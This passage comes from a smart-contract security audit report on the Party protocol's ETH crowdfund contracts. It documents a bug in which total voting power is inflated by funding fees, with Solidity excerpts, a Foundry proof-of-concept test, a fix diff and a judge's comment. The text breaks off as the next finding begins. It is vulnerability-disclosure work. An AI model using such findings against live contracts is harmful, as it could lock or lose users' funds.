class=\"mtk12\">fundingSplitBps_</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">fundingSplitBps</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">fundingSplitRecipient_</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">) &amp;&amp; </span><span class=\"mtk12\">fundingSplitBps_</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint96</span><span class=\"mtk1\"> </span><span class=\"mtk12\">feeAmount</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">fundingSplitBps_</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">1e4</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">feeAmount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// Calculate voting power.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">votingPower</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">exchangeRateBps</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">1e4</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>Even before that, <code>totalContributions</code> has been increased by the full <code>amount</code> (funding fees have not been subtracted yet):</p>\n<p><a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ETHCrowdfundBase.sol#L204-L222\">Link</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"24\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint96</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newTotalContributions</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">totalContributions</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint96</span><span class=\"mtk1\"> </span><span class=\"mtk12\">maxTotalContributions_</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">maxTotalContributions</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">newTotalContributions</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">maxTotalContributions_</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">totalContributions</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">maxTotalContributions_</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Finalize the crowdfund.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// This occurs before refunding excess contribution to act as a</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// reentrancy guard.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_finalize</span><span class=\"mtk1\">(</span><span class=\"mtk12\">maxTotalContributions_</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Refund excess contribution.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint96</span><span class=\"mtk1\"> </span><span class=\"mtk12\">refundAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">newTotalContributions</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">maxTotalContributions</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">refundAmount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">refundAmount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transferEth</span><span class=\"mtk1\">(</span><span class=\"mtk12\">refundAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">} </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">totalContributions</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">newTotalContributions</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>(Note that the above code looks more complicated than it is because it accounts for the fact that <code>maxTotalContributions</code> might be reached. But this is not important for explaining this issue)</p>\n<p>When <code>PartyGovernanceNFT.increaseTotalVotingPower</code> is called it is with the <code>newVotingPower</code> that has been calculated BEFORE funding fees are subtracted:</p>\n<p><a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ETHCrowdfundBase.sol#L278-L288\">Link</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"25\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint96</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newVotingPower</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">totalContributions_</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">exchangeRateBps</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">1e4</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">party</span><span class=\"mtk1\">.</span><span class=\"mtk11\">increaseTotalVotingPower</span><span class=\"mtk1\">(</span><span class=\"mtk12\">newVotingPower</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// Transfer fee to recipient if applicable.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">payable</span><span class=\"mtk1\"> </span><span class=\"mtk12\">fundingSplitRecipient_</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">fundingSplitRecipient</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint16</span><span class=\"mtk1\"> </span><span class=\"mtk12\">fundingSplitBps_</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">fundingSplitBps</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">fundingSplitRecipient_</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">) &amp;&amp; </span><span class=\"mtk12\">fundingSplitBps_</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint96</span><span class=\"mtk1\"> </span><span class=\"mtk12\">feeAmount</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">totalContributions_</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">fundingSplitBps_</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">1e4</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">totalContributions_</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">feeAmount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">fundingSplitRecipient_</span><span class=\"mtk1\">.</span><span class=\"mtk11\">transferEth</span><span class=\"mtk1\">(</span><span class=\"mtk12\">feeAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>Therefore <code>totalVotingPower</code> is increased more than the sum of the voting power that the users have received.</p>\n<p>Let’s look at the PoC:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"javascript\" data-index=\"26\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">test_totalVotingPower_increased_too_much</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ReraiseETHCrowdfund</span><span class=\"mtk1\"> </span><span class=\"mtk12\">crowdfund</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_createCrowdfund</span><span class=\"mtk1\">({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">initialContribution:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">initialContributor:</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">initialDelegate:</span><span class=\"mtk1\"> </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">minContributions:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">maxContributions:</span><span class=\"mtk1\"> </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint96</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">disableContributingForExistingCard:</span><span class=\"mtk1\"> </span><span class=\"mtk4\">false</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">minTotalContributions:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">2</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">maxTotalContributions:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">5</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">duration:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">7</span><span class=\"mtk1\"> </span><span class=\"mtk12\">days</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">fundingSplitBps:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">1000</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">fundingSplitRecipient:</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">member1</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_randomAddress</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">member2</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_randomAddress</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">member1</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">member2</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Contribute, should be allowed to update delegate</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">member1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">crowdfund</span><span class=\"mtk1\">.</span><span class=\"mtk12\">contribute</span><span class=\"mtk1\">{ value: </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\"> }(</span><span class=\"mtk12\">member1</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">member2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">crowdfund</span><span class=\"mtk1\">.</span><span class=\"mtk12\">contribute</span><span class=\"mtk1\">{ value: </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\"> }(</span><span class=\"mtk12\">member2</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">skip</span><span class=\"mtk1\">(</span><span class=\"mtk7\">7</span><span class=\"mtk1\"> </span><span class=\"mtk12\">days</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk12\">party</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getGovernanceValues</span><span class=\"mtk1\">().</span><span class=\"mtk12\">totalVotingPower</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">crowdfund</span><span class=\"mtk1\">.</span><span class=\"mtk11\">finalize</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk12\">party</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getGovernanceValues</span><span class=\"mtk1\">().</span><span class=\"mtk12\">totalVotingPower</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk12\">crowdfund</span><span class=\"mtk1\">.</span><span class=\"mtk11\">pendingVotingPower</span><span class=\"mtk1\">(</span><span class=\"mtk12\">member1</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk12\">crowdfund</span><span class=\"mtk1\">.</span><span class=\"mtk11\">pendingVotingPower</span><span class=\"mtk1\">(</span><span class=\"mtk12\">member2</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>See that <code>totalVotingPower</code> is increased from <code>0</code> to <code>2e18</code>.</p>\n<p>The voting power of both users is <code>0.9e18</code> (10% fee).</p>\n<p>Thereby both users together receive a voting power of <code>1.8e18</code> which is only 90% of <code>2e18</code>.</p>\n<p>Therefore it is impossible to reach an unanimous vote.</p>\n<h3 id=\"tools-used-2\" style=\"position:relative;\"><a href=\"#tools-used-2\" aria-label=\"tools used 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VSCode, Foundry</p>\n<h3 id=\"recommended-mitigation-steps-5\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-5\" aria-label=\"recommended mitigation steps 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>The fix is easy:<br>\nWe must consider the funding fee when increasing the <code>totalVotingPower</code>.</p>\n<p>Fix:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"27\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/contracts/crowdfund/ETHCrowdfundBase.sol b/contracts/crowdfund/ETHCrowdfundBase.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 4392655..3c11160 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/contracts/crowdfund/ETHCrowdfundBase.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/contracts/crowdfund/ETHCrowdfundBase.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -274,10 +274,6 @@ contract ETHCrowdfundBase is Implementation {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // Finalize the crowdfund.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         delete expiry;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        // Update the party&#39;s total voting power.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        uint96 newVotingPower = (totalContributions_ * exchangeRateBps) / 1e4;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        party.increaseTotalVotingPower(newVotingPower);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // Transfer fee to recipient if applicable.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         address payable fundingSplitRecipient_ = fundingSplitRecipient;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint16 fundingSplitBps_ = fundingSplitBps;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -287,6 +283,10 @@ contract ETHCrowdfundBase is Implementation {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             fundingSplitRecipient_.transferEth(feeAmount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        // Update the party&#39;s total voting power.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint96 newVotingPower = (totalContributions_ * exchangeRateBps) / 1e4;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        party.increaseTotalVotingPower(newVotingPower);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // Transfer ETH to the party.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         payable(address(party)).transferEth(totalContributions_);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/11#issuecomment-1509823808\">0xean (judge) increased severity to High and commented</a>:</strong></p>\n<blockquote>\n<p>I am upgrading severity here to match <a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/27\"><code>#27</code></a> and will look forward to sponsor comments.</p>\n<p>I think this exposes a way in which there are parameter sets that leads to a loss of funds by not allowing any proposal to be executed. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/11#issuecomment-1512119443\">0xble (Party) confirmed</a></strong></p>\n<hr>\n<h2 id=\"h-07-initialethcrowdfund--reraiseethcrowdfund-batchcontributefor-function-may-not-refund-eth-which-leads-to-loss-of-funds\" style=\"position:relative;\"><a href=\"#h-07-initialethcrowdfund--reraiseethcrowdfund-batchcontributefor-function-may-not-refund-eth-which-leads-to-loss-of-funds\" aria-label=\"h 07 initialethcrowdfund  reraiseethcrowdfund batchcontributefor function may not refund eth which leads to loss of funds permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/7\">[H-07] <code>InitialETHCrowdfund</code> + <code>ReraiseETHCrowdfund</code>: <code>batchContributeFor</code> function may not refund ETH which leads to loss of funds</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/7\">HollaDieWaldfee</a>, also found by <a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/45\">evan</a> and <a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/28\">hansfriese</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/InitialETHCrowdfund.sol#L235-L268\">https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/InitialETHCrowdfund.sol#L235-L268</a></p>\n<p><a 